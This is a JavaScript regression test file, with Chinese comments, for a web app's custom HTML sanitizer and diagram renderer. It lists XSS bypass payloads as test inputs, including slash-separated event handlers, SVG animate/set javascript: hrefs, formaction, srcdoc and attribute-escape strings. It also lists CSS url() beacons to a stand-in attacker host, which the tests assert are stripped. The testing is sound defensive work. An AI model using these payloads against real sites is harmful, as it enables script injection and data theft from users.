/**
 * sanitize-xss-regression.test.js —— XSS 消毒回归（v3.7.59）
 * ----------------------------------------------------------------------------
 * 背景：本项目的 XSS 防线是**自研的 sanitizeHtml**（`src/util-markdown.js`，非 DOMPurify），
 * 全仓约 130 处 innerHTML 依赖它。2026-09-27 审计用实证脚本
 * （`_audit_evidence/xss-probe.mjs`）扫出 4 类可绕过写法，均已修复：
 *
 *   ① `<svg/onload=alert(1)>` —— 旧规则 `\s+on\w+` 要求**前置空白**，而 HTML 解析器
 *      在「before attribute name」状态同样把 `/` 当属性分隔符，故 `<tag/on…=…>` 照样触发。
 *   ② `<img/src=x/onerror=alert(1)>` —— 同类，`/` 分隔的多属性写法。
 *   ③ `<svg><a><animate attributeName="href" values="javascript:…">` —— 运行期改 href，
 *      源码里没有 `href=` 可供协议判定，消毒器看不见、浏览器会执行（`<set>` 同理）。
 *   ④ `<button formaction="javascript:…">` / `<form action="javascript:…">` ——
 *      旧协议白名单只覆盖 href|src，formaction/action 被原样放行。
 *
 * 另有一条**非 sanitizeHtml 路径**的注入（已修）：
 *   `render-overview.js` 的 `_dgmSvgHtml` 把 `n.id` 拼进 `data-dgm="…"`、把 `n.color` 拼进
 *   `style="fill:…"`，而调用点 `tmp.innerHTML = _dgmSvgHtml(d)` **没有过 sanitizeHtml**。
 *   数据源是 localStorage 的 `wb_agent_diagram`，导入 JSON 备份 / 云同步快照都能写入任意值 ——
 *   实测修复前 SVG `<g>` 内会解析出 2 个 HTML 命名空间 `<img onerror=…>`。
 *
 * 本文件的断言都是「把结果插进真实 DOM，再找仍然可执行的痕迹」，而不是字符串比对 ——
 * 字符串比对无法证明浏览器不会执行（这正是原实现漏掉 ①③④ 的原因）。
 */
import { describe, it, expect, beforeAll } from "vitest";
import { loadApp } from "./helpers/loadApp.js";

let win;
let __test;

beforeAll(() => {
  win = loadApp();
  __test = win.__test;
  expect(__test, "loadApp 未拿到 __test（HTML 可能不是交付态，先跑 npm run src:inject）").toBeTruthy();
});

/** 把一段 HTML 插进给定容器，收集「仍然可执行」的痕迹 */
function dangerousIn(html, container) {
  container.innerHTML = html;
  const bad = [];
  container.querySelectorAll("*").forEach((el) => {
    const tag = el.tagName.toLowerCase();
    for (const a of Array.from(el.attributes)) {
      if (/^on/i.test(a.name)) bad.push(`${tag}[${a.name}]`);
      if (/^(href|src|xlink:href|formaction|action|poster|background|dynsrc|lowsrc)$/i.test(a.name)) {
        const v = String(a.value).replace(/[\u0000-\u0020]/g, "");
        if (/^(javascript|vbscript|data):/i.test(v)) bad.push(`${tag}[${a.name}=${v.slice(0, 24)}]`);
      }
      if (/^attributeName$/i.test(a.name)) bad.push(`${tag}[attributeName]`);
    }
    if (/^(animate|animatetransform|animatemotion|set)$/.test(tag)) bad.push(`<${tag}>`);
  });
  return bad;
}

const BYPASS_CASES = [
  ["斜杠分隔事件属性 · <svg/onload>", `<svg/onload=alert(1)>`],
  ["斜杠分隔事件属性 · <img/src=x/onerror>", `<img/src=x/onerror=alert(1)>`],
  ["SVG animate 运行期改 href", `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>click</text></a></svg>`],
  ["SVG set 运行期改 href", `<svg><a><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>`],
  ["formaction javascript:", `<form><button formaction="javascript:alert(1)">go</button></form>`],
  ["form action javascript:", `<form action="javascript:alert(1)"></form>`],
  ["常规 onerror（基线，必须一直拦住）", `<img src=x onerror=alert(1)>`],
  ["换行分隔 onerror", `<img src=x\nonerror=alert(1)>`],
  ["大写 ONERROR", `<img src=x ONERROR=alert(1)>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)<\/script>"></iframe>`],
  ["body onload", `<body onload=alert(1)>`],
];

describe("sanitizeHtml：已知绕过写法必须全部拦住", () => {
  for (const [name, payload] of BYPASS_CASES) {
    it(name, () => {
      const clean = __test.sanitizeHtml(payload);
      const host = win.document.createElement("div");
      const bad = dangerousIn(clean, host);
      expect(bad, `${name}\n  消毒输出: ${clean}\n  残留: ${bad.join(", ")}`).toEqual([]);
    });
  }
});

describe("sanitizeHtml：不得误伤正常内容", () => {
  it("常规 HTML/属性/样式保留", () => {
    const clean = __test.sanitizeHtml(
      '<div class="card" data-dgm="n1" style="fill:#0a6cbd"><span>标题</span><br><a href="https://example.com/a">链接</a></div>'
    );
    expect(clean).toContain('class="card"');
    expect(clean).toContain('data-dgm="n1"');
    expect(clean).toContain("style=");
    expect(clean).toContain("<span>标题</span>");
    expect(clean).toContain('href="https://example.com/a"');
  });

  it("含 /on…= 字样的普通 URL 值不被破坏（斜杠规则限定在标签内）", () => {
    const clean = __test.sanitizeHtml('<a href="https://example.com/one=1">x</a>');
    expect(clean).toContain('href="https://example.com/one=1"');
  });

  it("内联 SVG 图标（本应用图标体系）保留", () => {
    const icon = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 21v-2"/><circle cx="12" cy="7" r="4"/></svg>';
    const clean = __test.sanitizeHtml(icon);
    expect(clean).toContain("<path");
    expect(clean).toContain("<circle");
  });
});

/* ============================================================
 * v3.7.90：style 属性**值**的消毒
 * ------------------------------------------------------------
 * 此前 sanitizeHtml 只看标签、on* 事件与 URL 类属性，**不看 style 的值**。
 * 而全仓约 25 处把动态值拼进内联 style（`style="color:${s.color}"` 等），
 * s.color 来自场景定义 —— 自定义场景 / 插件 JSON / 导入的备份与云快照都能写入任意值。
 * 危害不是执行 JS（现代浏览器 CSS 里做不到），而是外部请求信标与界面伪装。
 * ============================================================ */
describe("sanitizeHtml：style 值消毒（v3.7.90）", () => {
  it("style 里的 url(...) 被清除（阻断渲染即外发的信标）", () => {
    const clean = __test.sanitizeHtml('<span style="color:red;background:url(https://evil.example/beacon?d=1)">x</span>');
    expect(clean).not.toContain("evil.example");
    expect(clean).not.toMatch(/url\s*\(/i);
  });

  it("style 里的 @import / behavior / -moz-binding 被清除", () => {
    const a = __test.sanitizeHtml('<div style="@import url(https://evil.example/a.css)">x</div>');
    expect(a).not.toMatch(/@import/i);
    const b = __test.sanitizeHtml('<div style="behavior:url(#default#time2)">x</div>');
    expect(b).not.toMatch(/behavior\s*:/i);
    const c = __test.sanitizeHtml('<div style="-moz-binding:url(https://evil.example/x.xml)">x</div>');
    expect(c).not.toMatch(/-moz-binding/i);
  });

  it("style 里的 position / inset / z-index 被清除（阻断全屏覆盖层伪装）", () => {
    const clean = __test.sanitizeHtml('<span style="color:red;position:fixed;inset:0;z-index:99999">假登录框</span>');
    expect(clean).not.toMatch(/position\s*:/i);
    expect(clean).not.toMatch(/inset\s*:/i);
    expect(clean).not.toMatch(/z-index\s*:/i);
  });

  it("**不得误伤**合法内联样式：颜色/尺寸/transform/var()/color-mix()", () => {
    const clean = __test.sanitizeHtml(
      '<span style="color:var(--sc-office, #0a6cbd);background:color-mix(in srgb, var(--accent) 14%, transparent);font-size:var(--fs-lg);transform:translateY(2px)">x</span>'
    );
    expect(clean).toContain("var(--sc-office, #0a6cbd)");
    expect(clean).toContain("color-mix(in srgb");
    expect(clean).toContain("font-size:var(--fs-lg)");
    expect(clean).toContain("transform:translateY(2px)");
  });

  it("**不得误伤**合法定位写法：画布卡片与虚拟滚动依赖 left/top", () => {
    /* render-widgets.js:526 画布卡片、render-scene-main.js:47 虚拟滚动都在用 */
    const clean = __test.sanitizeHtml('<div class="cs-canvas-item" style="left:12px;top:34px;width:100px;height:60px">x</div>');
    expect(clean).toContain("left:12px");
    expect(clean).toContain("top:34px");
    expect(clean).toContain("width:100px");
  });

  it("**不得误伤** margin-top / border-top 这类含 top 字样的属性", () => {
    const clean = __test.sanitizeHtml('<p style="margin-top:var(--space-3);border-top:1px dashed var(--line)">x</p>');
    expect(clean).toContain("margin-top:var(--space-3)");
    expect(clean).toContain("border-top:1px dashed var(--line)");
  });

  it("无引号 style 写法同样被消毒，并规范化为双引号", () => {
    const clean = __test.sanitizeHtml("<span style=color:red;position:fixed>x</span>");
    expect(clean).not.toMatch(/position\s*:/i);
    expect(clean).toContain("style=");
  });
});

describe("_dgmSvgHtml：图表节点字段不得逃出属性/样式", () => {
  const evil = {
    nodes: [{
      id: 'n1" onmouseover="alert(1)',
      x: 10, y: 10, w: 80, h: 30,
      text: "正常文本",
      color: 'red"></g><img src=x onerror=alert(2)><g style="fill:red',
    }],
    edges: [],
  };

  it("HTML 上下文（div.innerHTML）无注入残留", () => {
    const out = __test._dgmSvgHtml(evil);
    const host = win.document.createElement("div");
    const bad = dangerousIn(out, host);
    expect(bad, `残留: ${bad.join(", ")}\n输出: ${out.slice(0, 200)}`).toEqual([]);
    expect(host.querySelectorAll("img").length, "不应生成 <img>").toBe(0);
  });

  it("真实调用点上下文（SVG <g>.innerHTML）无注入残留", () => {
    const out = __test._dgmSvgHtml(evil);
    const g = win.document.createElementNS("http://www.w3.org/2000/svg", "g");
    const bad = dangerousIn(out, g);
    expect(bad, `残留: ${bad.join(", ")}`).toEqual([]);
    const htmlNs = Array.from(g.children).filter((e) => e.namespaceURI === "http://www.w3.org/1999/xhtml");
    expect(htmlNs.map((e) => e.tagName), "SVG 内不得出现 HTML 命名空间元素").toEqual([]);
  });

  it("数值字段被强制转数字（防属性逃逸）", () => {
    const out = __test._dgmSvgHtml({ nodes: [{ id: "n1", x: '1" onload="alert(1)', y: 0, w: "0\" onerror=\"alert(1)", h: 10, text: "t" }], edges: [] });
    const host = win.document.createElement("div");
    expect(dangerousIn(out, host)).toEqual([]);
  });

  it("正常节点仍照常渲染（修复未误伤）", () => {
    const out = __test._dgmSvgHtml({
      nodes: [{ id: "n1", x: 0, y: 0, w: 100, h: 40, text: "节点", shape: "round", color: "#0a6cbd" }],
      edges: [],
    });
    expect(out).toContain('data-dgm="n1"');
    expect(out).toContain("节点");
    expect(out).toContain("fill:#0a6cbd");
    expect(out).toContain("<rect");
  });

  it("缺字段/非数组输入不抛异常", () => {
    expect(() => __test._dgmSvgHtml({})).not.toThrow();
    expect(() => __test._dgmSvgHtml({ nodes: "x", edges: null })).not.toThrow();
    expect(__test._dgmSvgHtml({})).toBe("");
  });});

describe("_dgmColor：只放行安全 CSS 颜色字面量", () => {
  it("合法颜色原样放行", () => {
    for (const c of ["#0a6cbd", "#abc", "#0a6cbdff", "red", "transparent", "rgb(1, 2, 3)", "rgba(1,2,3,.5)", "hsl(120, 50%, 50%)"]) {
      expect(__test._dgmColor(c), c).toBe(c);
    }
  });

  it("含引号/尖括号/分号的注入串一律丢弃", () => {
    for (const c of ['red"></g><img src=x onerror=1>', "expression(alert(1))", "url(javascript:1)", "red;background:url(x)", "", null, undefined, 123]) {
      expect(__test._dgmColor(c), String(c)).toBe("");
    }
  });
});
